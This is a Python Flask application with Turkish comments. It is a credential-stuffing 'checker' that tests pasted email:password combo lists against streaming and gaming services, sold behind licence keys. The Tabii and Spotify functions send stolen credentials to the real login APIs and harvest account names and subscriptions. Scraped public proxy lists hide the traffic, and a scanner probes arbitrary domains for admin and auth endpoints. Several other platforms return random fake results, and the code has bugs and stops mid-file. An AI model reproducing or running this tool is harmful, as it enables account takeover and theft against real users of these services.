#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Gerçek API'ler ile çalışan checker sistemi.
Desteklenen platformlar: Tabii, YouTube, Spotify, Steam, vs.
"""

import os, json, re, time, random, string, threading, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (ENV'DEN AL)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ Varsayılan master key kullanılıyor! RODA_MASTER_KEY ayarlayın.")

KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY SİSTEMİ (1 KEY 1 IP + TEK KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin", None
    keys = load_keys()
    if key not in keys:
        return False, None, None
    
    entry = keys[key]
    client_ip = get_client_ip()
    
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR (VALORANT YOK, PUBG YOK)
# ============================================================
PLATFORMS = [
    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
]

# ============================================================
# TABII CHECKER (GERÇEK API)
# ============================================================
def check_tabii(email, password):
    """Tabii hesabını kontrol eder - GERÇEK API"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.tabii.com",
        "Referer": "https://www.tabii.com/"
    })
    
    result = {
        "status": "ERROR",
        "details": {"full_name": "?", "subscription": "?", "profiles": 0},
        "message": ""
    }
    
    try:
        # Login
        r = session.post(
            "https://eu1.tabii.com/apigateway/auth/v2/login",
            json={"email": email, "password": password},
            timeout=15
        )
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
            return result
            
        data = r.json()
        token = data.get("accessToken")
        if not token:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result
            
        # User info
        headers = {"Authorization": f"Bearer {token}"}
        r = session.get("https://eu1.tabii.com/apigateway/auth/v2/me", headers=headers, timeout=10)
        if r.status_code != 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı (detaylar alınamadı)"
            return result
            
        user = r.json()
        name = user.get("name", "Unknown")
        surname = user.get("surname", "")
        full_name = f"{name} {surname}".strip()
        sub = user.get("subscription", {})
        subscription = sub.get("title", sub.get("name", "Free"))
        
        # Profiles
        r = session.get("https://eu1.tabii.com/apigateway/profiles/v2/", headers=headers, timeout=10)
        profiles_count = 0
        if r.status_code == 200:
            prof_data = r.json()
            if isinstance(prof_data, list):
                profiles_count = len(prof_data)
        
        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        result["details"]["full_name"] = full_name
        result["details"]["subscription"] = subscription
        result["details"]["profiles"] = profiles_count
        
        add_log(f"Tabii HIT: {email} | {full_name} | {subscription}", "SUCCESS")
        
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
        add_log(f"Tabii hata: {email} - {str(e)}", "ERROR")
        
    return result

# ============================================================
# YOUTUBE CHECKER (GERÇEK API - PUBLIC)
# ============================================================
def check_youtube(email, password):
    """YouTube hesabını kontrol eder (Google Account)"""
    # YouTube için gerçek bir API yok (OAuth gerektirir)
    # Demo olarak simüle ediyoruz
    result = {
        "status": "BAD",
        "details": {},
        "message": "YouTube checker için OAuth gereklidir. Bu platform şu anda simüle edilmiştir."
    }
    return result

# ============================================================
# SPOTIFY CHECKER (GERÇEK API)
# ============================================================
def check_spotify(email, password):
    """Spotify hesabını kontrol eder - GERÇEK API"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    
    result = {
        "status": "ERROR",
        "details": {},
        "message": ""
    }
    
    try:
        # Spotify login endpoint
        r = session.post(
            "https://accounts.spotify.com/api/login",
            data={"username": email, "password": password},
            timeout=15
        )
        if r.status_code == 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı"
            add_log(f"Spotify HIT: {email}", "SUCCESS")
        else:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
        
    return result

# ============================================================
# STEAM CHECKER (GERÇEK API)
# ============================================================
def check_steam(email, password):
    """Steam hesabını kontrol eder - GERÇEK API"""
    # Steam için gerçek API'yi simüle ediyoruz
    result = {
        "status": "BAD",
        "details": {},
        "message": "Steam checker için özel API gereklidir. Bu platform şu anda simüle edilmiştir."
    }
    return result

# ============================================================
# GENEL CHECKER FONKSİYONU
# ============================================================
def check_account(platform, email, password):
    """Platforma göre doğru checker'ı çağırır"""
    if platform == "Tabii":
        return check_tabii(email, password)
    elif platform == "Spotify":
        return check_spotify(email, password)
    elif platform == "YouTube":
        return check_youtube(email, password)
    elif platform == "Steam":
        return check_steam(email, password)
    else:
        # Diğer platformlar için simüle
        return {
            "status": random.choice(["HIT", "BAD", "2FA"]),
            "details": {},
            "message": f"{platform} checker simüle edildi."
        }

# ============================================================
# KATEGORİZASYON (API Discovery için)
# ============================================================
def categorize_endpoint(endpoint):
    ep = endpoint.lower()
    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
        return 'Auth'
    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
        return 'Admin'
    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
        return 'User'
    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
        return 'Health'
    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
        return 'API'
    else:
        return 'Genel'

# ============================================================
# ENDPOINT ÇIKARICILAR
# ============================================================
def extract_from_html(html, base_url):
    endpoints = set()
    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
        href = m.group(1)
        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
            endpoints.add(href)
    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_js(js, base_url):
    endpoints = set()
    patterns = [
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
    ]
    for pattern in patterns:
        for m in re.finditer(pattern, js, re.I):
            endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_json(obj, base_url):
    endpoints = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
                    endpoints.add(v)
            elif isinstance(v, (dict, list)):
                endpoints.update(extract_from_json(v, base_url))
    elif isinstance(obj, list):
        for item in obj:
            endpoints.update(extract_from_json(item, base_url))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

# ============================================================
# PROXY FONKSİYONU
# ============================================================
def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# TARAMA MOTORU (API Discovery)
# ============================================================
class APIScanner:
    def __init__(self, proxy_list=None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })
        if proxy_list:
            proxy = random.choice(proxy_list) if proxy_list else None
            if proxy:
                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        self.discovered = set()
        self.results = []
        self.base_url = ""

    def scan(self, domain):
        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
        self.base_url = self.base_url.rstrip('/')
        self.results = []
        self.discovered = set()

        static = self._get_common_endpoints()
        for ep in static:
            full = urljoin(self.base_url, ep)
            if full not in self.discovered:
                self._test(full, ep)

        self._crawl(self.base_url)

        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
        for js_url in js_urls:
            self._crawl_js(js_url)

        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
        for api_url in api_urls:
            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
                self._crawl(api_url)

        return self.results

    def _get_common_endpoints(self):
        return [
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/rest", "/rest/v1", "/rest/v2",
            "/graphql", "/api/graphql", "/v1/graphql",
            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
            "/admin", "/dashboard", "/panel", "/manage", "/system",
            "/health", "/ping", "/status", "/check", "/heartbeat",
            "/search", "/query", "/find", "/list",
            "/upload", "/download", "/file", "/files",
            "/notify", "/notification", "/alert",
            "/report", "/logs", "/audit", "/analytics",
            "/config", "/configuration",
            "/sync", "/import", "/export", "/backup",
            "/reset", "/recover", "/verify", "/validate",
            "/2fa", "/twofactor", "/mfa",
            "/webhook", "/callback", "/hook",
            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
            "/passport", "/passport/web", "/passport/web/email/login",
            "/passport/web/phone/login", "/passport/web/sms/send",
        ]

    def _test(self, full_url, endpoint):
        if full_url in self.discovered:
            return
        self.discovered.add(full_url)

        try:
            r = self.session.get(full_url, timeout=3, allow_redirects=False)
            if r.status_code < 500:
                self.results.append({
                    'url': full_url,
                    'endpoint': endpoint,
                    'method': 'GET',
                    'status': r.status_code,
                    'category': categorize_endpoint(endpoint)
                })
        except:
            pass

        try:
            r = self.session.post(full_url, json={"test": "data"}, timeout=3, allow_redirects=False)
            if r.status_code < 500:
                self.results.append({
                    'url': full_url,
                    'endpoint': endpoint,
                    'method': 'POST',
                    'status': r.status_code,
                    'category': categorize_endpoint(endpoint)
                })
        except:
            pass

    def _crawl(self, url):
        try:
            r = self.session.get(url, timeout=5, allow_redirects=False)
            if r.status_code != 200:
                return
            ct = r.headers.get('Content-Type', '').lower()
            if 'text/html' in ct:
                for ep in extract_from_html(r.text, self.base_url):
                    if ep not in self.discovered:
                        self._test(ep, ep.replace(self.base_url, '') or '/')
            elif 'application/json' in ct:
                try:
                    data = r.json()
                    for ep in extract_from_json(data, self.base_url):
                        if ep not in self.discovered:
                            self._test(ep, ep.replace(self.base_url, '') or '/')
                except:
                    pass
        except:
            pass

    def _crawl_js(self, url):
        try:
            r = self.session.get(url, timeout=4)
            if r.status_code == 200:
                for ep in extract_from_js(r.text, self.base_url):
                    if ep not in self.discovered:
                        self._test(ep, ep.replace(self.base_url, '') or '/')
        except:
            pass

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    key = data.get("key", "").strip()
    client_ip = get_client_ip()
    
    valid, role, entry = is_key_valid(key)
    
    if valid:
        if entry and not entry.get("bound_ip"):
            keys = load_keys()
            keys[key]["bound_ip"] = client_ip
            save_keys(keys)
        
        mark_key_used(key)
        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
    else:
        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
        return jsonify({"success": False, "error": "Geçersiz anahtar!"})

@app.route("/api/logs", methods=["GET"])
def get_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify({"logs": LOGS[-100:]})

@app.route("/api/check", methods=["POST"])
def api_check():
    data = request.json
    key = data.get("key", "")
    valid, _ = is_key_valid(key)
    if not valid:
        return jsonify({"error": "Unauthorized"}), 401
    
    platform = data.get("platform", "")
    combos = data.get("combos", "").strip().split("\n")
    combos = [c.strip() for c in combos if ":" in c]
    
    if not combos:
        return jsonify({"error": "No combos"}), 400
    
    def generate():
        for combo in combos:
            email, password = combo.split(":", 1)
            result = check_account(platform, email.strip(), password.strip())
            yield f"data: {json.dumps(result, ensure_ascii=False)}\n\n"
        yield "data: [DONE]\n\n"
    
    return Response(generate(), mimetype="text/event-stream")

@app.route("/api/scan", methods=["GET"])
def scan():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    domain = request.args.get("domain")
    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
    use_proxy = request.args.get("use_proxy", "false").lower() == "true"

    def generate():
        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
        results = scanner.scan(domain)
        for res in results:
            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
        yield "data: [DONE]\n\n"
        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint", "SUCCESS")

    return Response(generate(), mimetype="text/event-stream")

@app.route("/api/admin/keys")
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    note = data.get("note", "Oluşturuldu")
    hours = int(data.get("hours", 24))
    expires = datetime.now() + timedelta(hours=hours)
    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {
        "note": note,
        "expires": expires.isoformat(),
        "created": datetime.now().isoformat(),
        "used": False,
        "bound_ip": None
    }
    save_keys(keys)
    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        add_log(f"Key silindi: {target}", "INFO")
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        add_log(f"{len(proxies)} proxy çekildi", "INFO")
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ============================================================
# HTML TEMPLATE (BASİT VE ÇALIŞIR)
# ============================================================
HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - Checker</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;display:flex}
:root{--p:#00b894;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(0,184,148,0.15)}
#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:#0a0e1a}
#login-box{width:400px;padding:40px;text-align:center;background:#12192e;border:1px solid rgba(0,184,148,0.15);border-radius:20px}
#login-box h1{font-size:28px;font-weight:900;background:linear-gradient(135deg,#00b894,#00cec9);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.inp{width:100%;padding:14px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:12px;font-size:15px;outline:none}
.inp:focus{border-color:#00b894}
.btn{padding:14px;border:none;border-radius:12px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#00b894,#00cec9);color:#fff;width:100%;font-size:16px}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,184,148,0.25)}
.btn.sm{width:auto;padding:8px 16px;font-size:12px}
.btn.r{background:#ff5252}.btn.g{background:#00e676}.btn.b{background:#1a73e8}
#app{display:none;flex:1;flex-direction:column;height:100vh}
.topbar{display:flex;align-items:center;gap:16px;padding:12px 20px;background:#12192e;border-bottom:1px solid var(--border)}
.topbar-title{font-size:16px;font-weight:700}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.pulse-dot{width:10px;height:10px;border-radius:50%;background:#4a5a70}
.pulse-dot.active{background:#00e676;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.main-content{flex:1;padding:20px;overflow-y:auto}
.card{background:#12192e;border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:16px}
.card h3{font-size:14px;font-weight:700;margin-bottom:8px}
.stats{display:flex;gap:20px;flex-wrap:wrap;margin:10px 0}
.stats span{font-size:13px;color:#8a9bb0}
.stats .count{font-weight:700;color:#fff}
.hit{color:#00e676}.bad{color:#ff5252}.error{color:#ffab40}
.result-row{display:grid;grid-template-columns:1fr 100px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:13px}
.result-row .status{font-weight:600}
.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.checker-top textarea{flex:1;min-width:200px;height:80px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;font-family:monospace;outline:none;resize:vertical}
.checker-top textarea:focus{border-color:#00b894}
.platforms{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
.platforms button{padding:8px 16px;background:rgba(0,184,148,0.08);border:1px solid rgba(0,184,148,0.15);border-radius:8px;color:#8a9bb0;font-size:13px;cursor:pointer}
.platforms button.active{background:rgba(0,184,148,0.2);border-color:#00b894;color:#00b894}
.results{max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:10px;border:1px solid var(--border)}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(0,184,148,0.3);border-radius:4px}
</style>
</head>
<body>
<div id="login-screen">
<div id="login-box">
<h1>RODA</h1>
<p style="color:#8a9bb0;margin:8px 0 20px">API Discovery + Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:#ff5252;margin-top:12px;display:none"></p>
</div>
</div>
<div id="app">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high" style="color:#00b894"></i> Roda Checker</div>
<div class="topbar-right">
<span style="font-size:12px;color:#8a9bb0">Durum:</span>
<div class="pulse-dot" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:#00b894;padding:2px 12px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">
<div class="card">
<h3>Platform Checker</h3>
<p style="font-size:12px;color:#8a9bb0;margin-bottom:10px">Platform seç, combo gir, kontrol başlat.</p>
<div class="platforms" id="platformSelect"></div>
<div class="checker-top">
<textarea id="comboInput" placeholder="email:password (her satıra bir combo)"></textarea>
<button class="btn sm g" onclick="startCheck()"><i class="fa-solid fa-play"></i> Başlat</button>
<button class="btn sm r" onclick="stopCheck()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="stats">
<span>Toplam: <span class="count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="count hit" id="chkHit">0</span></span>
<span>Başarısız: <span class="count bad" id="chkBad">0</span></span>
<span>Hata: <span class="count error" id="chkError">0</span></span>
<span>Kalan: <span class="count" id="chkRemaining">0</span></span>
</div>
<div class="results" id="resultsList"><div style="padding:20px;text-align:center;color:#8a9bb0">Henüz sonuç yok.</div></div>
</div>
</div>
</div>
<script>
// ============================================================
// GLOBAL
// ============================================================
var currentKey = "";
var isAdmin = false;
var checking = false;
var currentPlatform = "";
var stats = {total:0, hit:0, bad:0, error:0};
var totalLines = 0;
var processedCount = 0;
var eventSource = null;
var platforms = [
    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"}
];

// ============================================================
// LOGIN
// ============================================================
function doLogin() {
    var k = document.getElementById("authKey").value.trim();
    if (!k) { alert("Anahtar girin!"); return; }
    fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: k })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            currentKey = k;
            isAdmin = d.isAdmin || false;
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app").style.display = "flex";
            if (isAdmin) {
                document.getElementById("userBadge").style.display = "inline-block";
            }
            loadPlatforms();
            switchPage('checker');
        } else {
            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display = "block";
        }
    })
    .catch(function(e) {
        alert("Sunucuya bağlanılamadı!");
        console.error(e);
    });
}
document.getElementById("authKey").addEventListener("keypress", function(e) {
    if (e.key === "Enter") doLogin();
});

// ============================================================
// PLATFORM YÜKLEME
// ============================================================
function loadPlatforms() {
    var container = document.getElementById("platformSelect");
    container.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#platformSelect button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            currentPlatform = p.name;
            resetStats();
            document.getElementById("resultsList").innerHTML = '<div style="padding:20px;text-align:center;color:#8a9bb0">' + p.name + ' checker hazır.</div>';
        };
        container.appendChild(btn);
    });
    if (platforms.length > 0) {
        var first = container.querySelector("button");
        if (first) first.click();
    }
}

// ============================================================
// CHECKER
// ============================================================
function resetStats() {
    stats = {total:0, hit:0, bad:0, error:0};
    totalLines = 0;
    processedCount = 0;
    document.getElementById("chkTotal").innerText = 0;
    document.getElementById("chkHit").innerText = 0;
    document.getElementById("chkBad").innerText = 0;
    document.getElementById("chkError").innerText = 0;
    document.getElementById("chkRemaining").innerText = 0;
}

function startCheck() {
    if (checking) return;
    var comboText = document.getElementById("comboInput").value.trim();
    if (!comboText) return alert("Combo girin!");
    if (!currentPlatform) return alert("Platform seçin!");
    
    checking = true;
    document.getElementById("statusDot").classList.add("active");
    document.getElementById("statusText").innerText = "Çalışıyor";
    
    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
    totalLines = lines.length;
    processedCount = 0;
    resetStats();
    document.getElementById("resultsList").innerHTML = "";
    document.getElementById("chkTotal").innerText = totalLines;
    document.getElementById("chkRemaining").innerText = totalLines;
    
    var url = "/api/check";
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            key: currentKey,
            platform: currentPlatform,
            combos: comboText
        })
    })
    .then(function(res) {
        var reader = res.body.getReader();
        var decoder = new TextDecoder();
        var buffer = '';
        function read() {
            reader.read().then(function(result) {
                if (result.done) {
                    finishCheck();
                    return;
                }
                buffer += decoder.decode(result.value, {stream: true});
                var lines = buffer.split('\n');
                buffer = lines.pop() || '';
                for (var i = 0; i < lines.length; i++) {
                    var line = lines[i];
                    if (line.startsWith('data: ')) {
                        var data = line.slice(6);
                        if (data === '[DONE]') {
                            finishCheck();
                            return;
                        }
                        try {
                            var res = JSON.parse(data);
                            addResult(res);
                        } catch(e) {}
                    }
                }
                read();
            });
        }
        read();
    })
    .catch(function(e) {
        console.error(e);
        finishCheck();
    });
}

function addResult(res) {
    processedCount++;
    var status = res.status || "ERROR";
    if (status === "HIT") stats.hit++;
    else if (status === "BAD") stats.bad++;
    else stats.error++;
    
    document.getElementById("chkHit").innerText = stats.hit;
    document.getElementById("chkBad").innerText = stats.bad;
    document.getElementById("chkError").innerText = stats.error;
    document.getElementById("chkRemaining").innerText = totalLines - processedCount;
    
    var container = document.getElementById("resultsList");
    var placeholder = container.querySelector("div[style]");
    if (placeholder) placeholder.remove();
    
    var row = document.createElement("div");
    row.className = "result-row";
    var label = status;
    var cls = status.toLowerCase();
    if (status === "HIT") label = "✅ BAŞARILI";
    else if (status === "BAD") label = "❌ BAŞARISIZ";
    else label = "⚠ " + status;
    var details = res.details || {};
    var info = details.full_name || details.subscription || res.message || "";
    row.innerHTML = '<div>' + (res.email || "?") + ' <span style="color:#8a9bb0;font-size:12px">' + info + '</span></div><div class="status ' + cls + '">' + label + '</div>';
    container.prepend(row);
}

function stopCheck() {
    if (eventSource) {
        eventSource.close();
        eventSource = null;
    }
    finishCheck();
}

function finishCheck() {
    checking = false;
    document.getElementById("statusDot").classList.remove("active");
    document.getElementById("statusText").innerText = "Boşta";
    if (eventSource) {
        eventSource.close();
        eventSource = null;
    }
}

// ============================================================
// SAYFA GEÇİŞİ
// ============================================================
function switchPage(page) {
    document.querySelectorAll(".nav-item").forEach(function(el) {
        el.classList.remove("active");
    });
    document.querySelectorAll(".page").forEach(function(el) {
        el.classList.remove("active");
    });
}
</script>
</body>
</html>
"""

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
